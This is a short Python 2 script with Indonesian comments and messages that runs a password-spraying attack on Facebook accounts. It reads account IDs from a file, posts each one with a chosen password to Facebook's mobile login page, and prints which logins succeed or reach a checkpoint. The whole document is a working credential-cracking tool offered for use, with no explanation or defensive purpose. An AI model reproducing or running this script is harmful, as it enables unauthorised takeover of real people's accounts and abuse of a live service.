import requests, sys, os, time



os.system("figlet MULTI BF")
print
id = raw_input("input name list id: ")
pw = raw_input("PASSWORD CRACK : ")


#url yg mau di gunakan
def main1(id,pw):
    url = "https://m.facebook.com/login.php"

    respon = requests.post(url, data = {"email":id, "pass":pw})
    if "m_sess" in respon.url:
           print "PASSWORD DI TEMUKAN =>", id, pw
    elif "checkpoint" in respon.url:
           print "AKUN CHECKPONIT"
    else:
           print "PASSWORD GAGAL =>", id, pw


def main2(id,pw):
    ex = open('list.txt', "r").readlines()
    for i in ex:
           main1(i.strip(),pw)


try:

    main2(id,pw)

except:
    exit()
